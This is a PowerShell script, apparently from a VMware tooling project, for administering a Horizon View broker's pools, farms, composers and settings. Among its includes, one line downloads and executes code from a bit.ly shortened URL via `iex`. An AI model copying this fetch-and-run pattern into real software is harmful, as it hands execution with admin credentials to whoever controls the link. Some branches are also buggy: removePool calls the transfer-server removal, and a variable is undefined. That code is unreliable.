<#
Copyright (c) 2012-2015 VMware, Inc.

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.
#>

<#
  .SYNOPSIS
    Broker 

  .DESCRIPTION
    View Broker configuration
    
  .FUNCTIONALITY
    View
    
  .NOTES
    AUTHOR: Jian Liu
    EMAIL: whirls9@hotmail.com
#>

Param (
##################### Start general parameters #####################
  [parameter(
    Mandatory=$true,
    HelpMessage="IP or FQDN of broker server"
  )]
  [string]
    $serverAddress, 
  
  [parameter(
    Mandatory=$true,
    HelpMessage="User name of broker administrator"
  )]
  [string]
    $serverUser, 
  
  [parameter(HelpMessage="Password of broker administrator")]
  [string]
    $serverPassword=$env:defaultPassword,  
##################### Start getDesktopState parameters #####################  
  [parameter(parameterSetName="addLinkedClonePool")]
  [parameter(parameterSetName="removePool")]  
  [parameter(parameterSetName="entitlePool")]
  [parameter(parameterSetName="rebalancePool")]
  [parameter(parameterSetName="recomposePool")]
  [parameter(parameterSetName="refreshPool")]
  [parameter(parameterSetName="logoffPool")]
  [parameter(parameterSetName="setHTMLAccess")]
  [parameter(parameterSetName="setPoolAutoRecovery")]
  [parameter(parameterSetName="setPoolID")]
  [parameter(parameterSetName="setPoolName")]
  [parameter(parameterSetName="addRdsAppPool")]
  [parameter(parameterSetName="addRdsDesktopPool")]
  [parameter(parameterSetName="deleteRdsAppPool")]
  [parameter(parameterSetName="deleteRdsDesktopPool")]
  [parameter(parameterSetName="entitleRdsAppPool")]
  [parameter(
    mandatory=$true,
    parameterSetName="getDesktopState",
    HelpMessage="Pool ID"
  )]
  [string]
    $poolId,
  
  [parameter(
    parameterSetName="getDesktopState",
    HelpMessage="This command get states of desktops in pools"
  )]
  [Switch]
    $getDesktopState,
##################### Start addComposer parameters #####################
  [parameter(parameterSetName="addLinkedClonePool")]
  [parameter(parameterSetName="addComposerDomain")]
  [parameter(parameterSetName="addVirtualCenter")]
  [parameter(parameterSetName="addManualPool")]
  [parameter(parameterSetName="addTransferServer")]
  [parameter(
    parameterSetName="addComposer",
    Mandatory=$true,
    HelpMessage="IP / FQDN of VC server"
  )]
  [string]
    $vcAddress, 
  
  [parameter(parameterSetName="addVirtualCenter")]
  [parameter(parameterSetName="addManualPool")]
  [parameter(parameterSetName="addTransferServer")]
  [parameter(
    parameterSetName="addComposer",
    HelpMessage="User name to connect to VC server (default is administrator)"
  )]
  [string]  
    $vcUser="administrator", 
  
  [parameter(parameterSetName="addVirtualCenter")]
  [parameter(parameterSetName="addManualPool")]
  [parameter(parameterSetName="addTransferServer")]
  [parameter(
    parameterSetName="addComposer",
    HelpMessage="Password of vcUser"
  )]
  [string]  
    $vcPassword=$env:defaultPassword,  
  
  [parameter(
    parameterSetName="addComposer",
    Mandatory=$true,
    HelpMessage="IP / FQDN of composer server"
  )]
  [string]
    $composerAddress, 
  
  [parameter(
    parameterSetName="addComposer",
    HelpMessage="User name to connect to composer server (default is 
      local\administrator)"
  )]
  [string]  
    $composerUser="administrator", 
  
  [parameter(
    parameterSetName="addComposer",
    HelpMessage="Password of composerUser"
  )]
  [string]  
    $composerPassword=$env:defaultPassword, 
  
  [parameter(
    parameterSetName="addComposer",
    HelpMessage="Composer port number, default is 18443"
  )]
  [string]
    $port="18443",
    
  [parameter(parameterSetName="addComposer")]
  [Switch]
    $addComposer,
##################### Start addComposerDomain parameters #####################
  [parameter(parameterSetName="addLinkedClonePool")]
  [parameter(
    parameterSetName="addComposerDomain",
    Mandatory=$true,
    HelpMessage="Composer domain name"
  )]
  [string]
    $domainName, 
  
  [parameter(
    parameterSetName="addComposerDomain",
    HelpMessage="User of composer domain (default is administrator)"
  )]
  [string]
    $domainUser="administrator", 
  
  [parameter(
    parameterSetName="addComposerDomain",
    HelpMessage="Password of domainUser"
  )]
  [string]  
    $domainPassword=$env:defaultPassword,
    
  [parameter(parameterSetName="addComposerDomain")]
  [Switch]
    $addComposerDomain,
##################### Start addVirtualCenter parameters #####################
  [parameter(
    parameterSetName="addVirtualCenter",
    Mandatory=$true,
    HelpMessage="Whether to use compopser if installed on VC"
  )]
  [ValidateSet(
    "false",
    "true"
  )]
    $useComposer,  
  
  [parameter(parameterSetName="addVirtualCenter")]
  [Switch]
    $addVirtualCenter,
##################### Start addLicense parameters #####################
  [parameter(
    parameterSetName="addLicense",
    Mandatory=$true,
    HelpMessage="License key"
  )]
  [string]
    $license,
    
  [parameter(parameterSetName="addLicense")]
  [Switch]
    $addLicense,
##################### Start entitlePool parameters #####################
  [parameter(parameterSetName="entitleRdsAppPool")]
  [parameter(
    parameterSetName="entitlePool",
    Mandatory=$true,
    HelpMessage="User name (in domain\user format)"
  )]
  [string]
    $userName,
   
  [parameter(parameterSetName="entitlePool")]
  [Switch]
    $entitlePool,
##################### Start addLinkedClonePool parameters #####################  
  [parameter(
    parameterSetName="addLinkedClonePool",
    HelpMessage="Name prefix, default is 'poolID-'"
  )]
  [string]
    $namePrefix,
    
  [parameter(parameterSetName="recomposePool")]
  [parameter(
    parameterSetName="addLinkedClonePool",
    Mandatory=$true,
    HelpMessage="Path to a virtual machine to be used as the parent VM 
      for this desktop pool."
  )]
  [string]
    $parentVmPath, 
  
  [parameter(parameterSetName="recomposePool")]
  [parameter(
    parameterSetName="addLinkedClonePool",
    Mandatory=$true,
    HelpMessage="Path to the snapshot that is to be used as the image 
      for this pool, i.e. /clean or /clean/test0"
  )]
  [string]
    $parentSnapshotPath, 
  
  [parameter(
    parameterSetName="addLinkedClonePool",
    Mandatory=$true,
    HelpMessage="Specify a location for this new directory as a vCenter 
      folder path."
  )]
  [string]
    $vmFolderPath, 
    
  [parameter(
    parameterSetName="addLinkedClonePool",
    Mandatory=$true,
    HelpMessage="Path to a resource pool to be used for this desktop pool."
  )]
  [string]
    $resourcePoolPath, 
  
  [parameter(
    parameterSetName="addLinkedClonePool",
    Mandatory=$true,
    HelpMessage="List of datastore specs for storage of desktop VMs and 
      data disks, separated by semicolons using the format: 
      '[Overcommit,usage]/path/to/datastore'"
  )]
  [string]
    $datastoreSpecs,
  
  [parameter(
    parameterSetName="addLinkedClonePool",
    HelpMessage="Data disk letter, default is 'U'"
  )]
  [string]
    $dataDiskLetter="U", 
  
  [parameter(
    parameterSetName="addLinkedClonePool",
    HelpMessage="Data disk size, default is 2048"
  )]
  [string]
    $dataDiskSize=2048, 
  
  [parameter(
    parameterSetName="addLinkedClonePool",
    HelpMessage="Temp disk size, default is 1024"
  )]
  [string]
    $tempDiskSize=1024,
  
  [parameter(
    parameterSetName="addLinkedClonePool",
    Mandatory=$true,
    HelpMessage="Minimum number of desktops to be provisioned in this pool."
  )]
  [string]
    $min, 
  
  [parameter(
    parameterSetName="addLinkedClonePool",
    Mandatory=$true,
    HelpMessage="Maximum number of desktops to be provisioned in this pool."
  )]
  [string]
    $max, 
  
  [parameter(parameterSetName="addManualPool")]
  [parameter(
    parameterSetName="addLinkedClonePool",
    Mandatory=$true,
    HelpMessage="Pool type"
  )]
  [ValidateSet(
    "Persistent",
    "NonPersistent"
  )]
  [string]
    $poolType="Persistent",
    
  [parameter(parameterSetName="addLinkedClonePool")]
  [Switch]
    $addLinkedClonePool,
##################### Start addManualPool parameters #####################   
  [parameter(
    parameterSetName="addManualPool",
    Mandatory=$true,
    HelpMessage="Agent virtual machine name in the vCenter inventory. 
      Support multiple values seperated by comma."
  )]
  [string]
    $agentVmName,
    
  [parameter(parameterSetName="addManualPool")]
  [Switch]
    $addManualPool,
##################### Start addTransferServer parameters #####################    
  [parameter(parameterSetName="removeTransferServer")]
  [parameter(
    parameterSetName="addTransferServer",
    Mandatory=$true,
    HelpMessage="Transfer server virtual machine name in the vCenter inventory"
  )]
  [string]
    $tsVmName,
    
  [parameter(parameterSetName="addTransferServer")]
  [Switch]
    $addTransferServer,
##################### Start removeTransferServer parameters #####################      
  [parameter(parameterSetName="removeTransferServer")]
  [Switch]
    $removeTransferServer,
##################### Start removePool parameters #####################   
  [parameter(
    parameterSetName="removePool",
    HelpMessage="Whether to remove VM from disk. Default is false"
  )]
  [ValidateSet(
    "false",
    "true"
  )]
    $rmFromDisk="false",
    
  [parameter(parameterSetName="removePool")]
  [Switch]
    $removePool,
##################### Start rebalancePool parameters #####################      
  [parameter(
    parameterSetName="rebalancePool",
    helpMessage="Rebalance linked clone pool"
  )]
  [Switch]
    $rebalancePool,
##################### Start recomposePool parameters #####################      
  [parameter(
    parameterSetName="recomposePool",
    helpMessage="Recompose linked clone pool"
  )]
  [Switch]
    $recomposePool,
##################### Start refreshPool parameters #####################      
  [parameter(
    parameterSetName="refreshPool",
    helpMessage="Refresh linked clone pool"
  )]
  [Switch]
    $refreshPool,
##################### Start logoffPool parameters #####################      
  [parameter(
    parameterSetName="logoffPool",
    helpMessage="Send session logoff message to all desktops in a pool"
  )]
  [Switch]
    $logoffPool,
##################### Start exportSettings parameters #####################      
  [parameter(parameterSetName="importSettings")]
  [parameter(
    parameterSetName="exportSettings",
    HelpMessage="Path to the broker settings file, default is c:\temp\broker.ldif"
  )]
  [string]
    $filePath="c:\temp\broker.ldif",
  
  [parameter(parameterSetName="exportSettings")]
  [Switch]
    $exportSettings,
##################### Start importSettings parameters #####################      
  [parameter(parameterSetName="importSettings")]
  [Switch]
    $importSettings,
##################### Start setDirectConnect parameters #####################   
  [parameter(parameterSetName="setDirectPCoIP")]
  [parameter(parameterSetName="setHTMLAccess")]
  [parameter(parameterSetName="setMMRPolicy")]
  [parameter(parameterSetName="setPoolAutoRecovery")]
  [parameter(parameterSetName="setFarmHtmlAccess")]
  [parameter(
    parameterSetName="setDirectConnect",
    mandatory=$true,
    HelpMessage="Select true to enable or false to disable"
  )]
  [ValidateSet(
    "false",
    "true"
  )]
    $enable,
    
  [parameter(
    parameterSetName="setDirectConnect",
    helpMessage="Connect to desktop directly or via security tunnel"
  )]
  [Switch]
    $setDirectConnect,
##################### Start setDirectPCoIP parameters #####################   
  [parameter(
    parameterSetName="setDirectPCoIP",
    helpMessage="Configure direct PCoIP connection"
  )]
  [Switch]
    $setDirectPCoIP,
##################### Start setEventDB parameters #####################
  [parameter(
    parameterSetName="setEventDB",
    Mandatory=$true,
    HelpMessage="IP / FQDN of database server"
  )]
  [string]
    $dbAddress, 
  
  [parameter(
    parameterSetName="setEventDB",
    HelpMessage="Database server type, default is SQLSERVER"
  )]
  [ValidateSet(
    "SQLSERVER",
    "ORACLE"
  )]
  [string]
    $dbType="SQLSERVER",
  
  [parameter(
    parameterSetName="setEventDB",
    HelpMessage="Port, default is 1433"
  )]
  [string]
    $dbPort="1433",
  
  [parameter(
    parameterSetName="setEventDB",
    Mandatory=$true,
    HelpMessage="Database name"
  )]
  [string]
    $dbName,
  
  [parameter(
    parameterSetName="setEventDB",
    HelpMessage="Database user name, default is administrator"
  )]
  [string]
    $dbUser="administrator",
  
  [parameter(
    parameterSetName="setEventDB",
    Mandatory=$true,
    HelpMessage="Password of dbUser"
  )]
  [string]
    $dbPassword=$env:defaultPassword,
  
  [parameter(
    parameterSetName="setEventDB",
    Mandatory=$true,
    HelpMessage="Table prefix"
  )]
  [string]
    $tablePrefix,
  
  [parameter(parameterSetName="setEventDB")]
  [Switch]
    $setEventDB,
##################### Start setHTMLAccess parameters #####################     
  [parameter(parameterSetName="setHTMLAccess")]
  [Switch]
    $setHTMLAccess,
##################### Start setMMRPolicy parameters #####################   
  [parameter(parameterSetName="setMMRPolicy")]
  [Switch]
    $setMMRPolicy,
##################### Start setPoolAutoRecovery parameters #####################   
  [parameter(parameterSetName="setPoolAutoRecovery")]
  [Switch]
    $setPoolAutoRecovery,
##################### Start setPoolID parameters #####################
  [parameter(
    parameterSetName="setPoolID",
    mandatory=$true,
    helpMessage="New pool ID"
  )]
  [string]
    $newId,
    
  [parameter(parameterSetName="setPoolID")]
  [Switch]
    $setPoolID,
##################### Start setPoolName parameters #####################
  [parameter(
    parameterSetName="setPoolName",
    mandatory=$true,
    helpmessage="Pool name"
  )]
  [string]
    $poolName,
    
  [parameter(parameterSetName="setPoolName")]
  [Switch]
    $setPoolName,
##################### Start setPairingPassword parameters #####################   
  [parameter(
    parameterSetName="setPairingPassword",
    mandatory=$true,
    HelpMessage="Pairing password, default is 111111"
  )]
  [string]
    $pairingPassword,
    
  [parameter(
    parameterSetName="setPairingPassword",
    HelpMessage="Pairing password timeout in term of seconds, 
      default is 86400"
  )]
  [int]  
    $timeout=86400,
    
  [parameter(
    parameterSetName="setPairingPassword",
    HelpMessage="Specify Security Server Pairing Password"
  )]
  [Switch]
    $setPairingPassword,
##################### Start addFarm parameters #####################   
  [parameter(parameterSetName="addRdsServerToFarm")]
  [parameter(parameterSetName="addFarmWithRdsServer")]
  [parameter(parameterSetName="addRdsAppPool")]
  [parameter(parameterSetName="addRdsDesktopPool")]
  [parameter(parameterSetName="removeRdsServerFromFarm")]
  [parameter(parameterSetName="setFarmHtmlAccess")]
  [parameter(
    parameterSetName="addFarm",
    mandatory=$true,
    HelpMessage="Farm ID"
  )]
  [string]
    $farmId,
    
  [parameter(parameterSetName="addFarm")]
  [Switch]
    $addFarm,
##################### Start addRdsServerToFarm parameters #####################   
  [parameter(parameterSetName="addFarmWithRdsServer")]
  [parameter(parameterSetName="removeRdsServerFromFarm")]
  [parameter(
    parameterSetName="addRdsServerToFarm",
    mandatory=$true,
    HelpMessage="RDS server FQDN"
  )]
  [string]
    $rdsServerDnsName,
    
  [parameter(parameterSetName="addRdsServerToFarm")]
  [Switch]
    $addRdsServerToFarm,
##################### Start addFarmWithRdsServer parameters #####################     
  [parameter(parameterSetName="addFarmWithRdsServer")]
  [Switch]
    $addFarmWithRdsServer,
##################### Start addRdsAppPool parameters #####################   
  [parameter(
    parameterSetName="addRdsAppPool",
    mandatory=$true,
    HelpMessage="Application executable path"
  )]
  [string]
    $execPath,
    
  [parameter(parameterSetName="addRdsAppPool")]
  [Switch]
    $addRdsAppPool,
##################### Start addRdsDesktopPool parameters #####################     
  [parameter(parameterSetName="addRdsDesktopPool")]
  [Switch]
    $addRdsDesktopPool,
##################### Start deleteRdsAppPool parameters #####################     
  [parameter(parameterSetName="deleteRdsAppPool")]
  [Switch]
    $deleteRdsAppPool,
##################### Start deleteRdsDesktopPool parameters #####################     
  [parameter(parameterSetName="deleteRdsDesktopPool")]
  [Switch]
    $deleteRdsDesktopPool,
##################### Start entitleRdsAppPool parameters #####################     
  [parameter(parameterSetName="entitleRdsAppPool")]
  [Switch]
    $entitleRdsAppPool,
##################### Start removeRdsServerFromFarm parameters #####################     
  [parameter(parameterSetName="removeRdsServerFromFarm")]
  [Switch]
    $removeRdsServerFromFarm,
##################### Start setFarmHtmlAccess parameters #####################   
  [parameter(parameterSetName="setFarmHtmlAccess")]
  [Switch]
    $setFarmHtmlAccess
)

. .\utils.ps1
. .\view\broker\object.ps1
. .\vsphere\object.ps1
$web = new-object net.webclient
iex $web.downloadstring('http://bit.ly/1Je9cuh') # windows\object.ps1

$broker = newBroker $serverAddress $serverUser $serverPassword
$broker.initialize()

switch ($pscmdlet.parameterSetName) {
  "getDesktopState" { 
    try {
      $states = invoke-command -scriptBlock $get_DesktopState -session $broker.session `
        -EA stop -argumentlist $poolId | select pool_id, name, user_displayname, state
      addToResult $states "dataset"
    } catch {
      addToResult "Fail - get desktop state"
      endError
    }
    addToResult "Success - get desktop state" 
  }
  "setEventDB" { 
    try {
      invoke-command -scriptBlock $set_EventDB -session $broker.session `
        -EA stop -argumentlist $dbAddress, $dbType, $dbPort, $dbName, `
          $dbUser, $dbPassword, $tablePrefix
    } catch {
      addToResult "Fail - set event database"
      endError
    }
    addToResult "Success - set event database" 
  }
  "addComposer" { 
    $broker.addComposer($vcAddress, $composerAddress, $composerUser, `
      $composerPassword, $port) 
  }
  "addComposerDomain" {
    $broker.addComposerDomain($vcAddress, $domainName, $domainUser, `
      $domainPassword)
  }
  "addVirtualCenter" {
    $useComposer = [System.Convert]::ToBoolean("$useComposer")
    $broker.addVc($vcAddress, $vcUser, $vcPassword, $useComposer)
  }
  "addLicense" {
    $broker.addLicense($license)
  }
  "entitlePool" {
    $domain = $userName.split("\")[0]
    $user = $userName.split("\")[1]
    $broker.entitlePool($poolId, $user, $domain)
  }
  "addLinkedClonePool" {
    if (!$namePrefix) {$namePrefix = $poolId + "-"}
    $broker.addLinkedClonePool($vcAddress, $composerDomainName, $poolId, `
      $namePrefix, $parentVmPath, $parentSnapshotPath, $vmFolderPath, `
      $resourcePoolPath, $datastoreSpecs, $dataDiskLetter, $dataDiskSize, `
      $tempDiskSize, $min, $max, $poolType)
  }
  "addManualPool" {
    $agentVmNameList = $agentVmName.split(",") | %{$_.trim()}
    $vc = newServer $vcAddress $vcUser $vcPassword
    $broker.addManualPool($vc, $agentVmNameList, $poolId, $poolType)
  }
  "addTransferServer" {
    $vc = newServer $vcAddress $vcUser $vcPassword
    $tsVmPath = $vc.getVmPath($tsVmName)
    $broker.addTransferServer($vcAddress, $tsVmPath)
  }
  "removeTransferServer" {
    $broker.removeTransferServer($tsVmName)
  }
  "removePool" {
    $rmFromDisk = [System.Convert]::ToBoolean("$rmFromDisk")
    $broker.removeTransferServer($poolId, $rmFromDisk)
  }
  "rebalancePool" {
    $broker.rebalanceLinkedClonePool($poolId)
  }
  "recomposePool" {
    $broker.recomposeLinkedClonePool($poolId,$parentVmPath,$parentSnapshotPath)
  }
  "refreshPool" {
    $broker.refreshLinkedClonePool($poolId)
  }
  "logoffPool" {
    $broker.sendSessionLogoff($poolId)
  }
  "importSettings" {
    $broker.importSettings($filePath)
  }
  "exportSettings" {
    $broker.exportSettings($filePath)
  }
  "setDirectConnect" {
    $broker.setDirectConnect([bool]$enable)
  }
  "setDirectPCoIP" {
    $broker.setDirectPCoIP([bool]$enable)
  }
  "setMMRPolicy" {
    $broker.setMMRPolicy([bool]$enable)
  }
  "setHTMLAccess" {
    $broker.setHTMLAccess($poolId, [bool]$enable)
  }
  "setPoolAutoRecovery" {
    $broker.setPoolAutoRecovery($poolId, [bool]$enable)
  }
  "setPoolID" {
    $broker.setPoolId($poolId, $newId)
  }
  "setPoolName" {
    $broker.setPoolName($poolId, $poolName)
  }
  "setPairingPassword" {
    $broker.setPairingPassword($pairingPassword, $timeout)
  }
  "addFarm" {
    $broker.addFarm($farmId)
  }
  "addRdsServerToFarm" {
    $broker.addRdsServerToFarm($farmId, $rdsServerDnsName)
  }
  "addFarmWithRdsServer" {
    $broker.addFarm($farmId)
    $broker.addRdsServerToFarm($farmId, $rdsServerDnsName)
  }
  "addRdsAppPool" {
    $broker.addRdsAppPool($farmId,$poolId, $execPath)
  }
  "addRdsDesktopPool" {
    $broker.addRdsDesktopPool($farmId,$poolId)
  }
  "deleteRdsAppPool" {
    $broker.deleteRdsAppPool($poolId)
  }
  "deleteRdsDesktopPool" {
    $broker.deleteRdsDesktopPool($poolId)
  }
  "entitleRdsAppPool" {
    $domain = $userName.split("\")[0]
    $user = $userName.split("\")[1]
    $broker.entitleRdsAppPool($user,$domain,$poolId)
  }
  "removeRdsServerFromFarm" {
    $broker.removeRdsServerFromFarm($farmId, $rdsServerDnsName)
  }
  "setFarmHtmlAccess" {
    $broker.setFarmHtmlAccess($farmId, [bool]$enable)
  }
}
